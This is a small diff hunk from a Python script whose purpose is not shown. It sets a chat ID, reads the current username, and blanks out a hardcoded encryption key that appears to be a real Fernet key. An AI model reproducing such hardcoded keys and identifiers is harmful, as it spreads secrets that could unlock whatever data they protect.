@@ -38,7 +38,7 @@ chat_id = "6092309166"  # Replace with your chat ID
 
 username = getpass.getuser()
 
-key = "jmJ1hppnj8npXmYe13w3nUBH3KfUClQu0PLWS1VvTHk="
+key = ""
 
 file_path = "D:\\python project\\pythonProject\\python"
 extend = "\\"
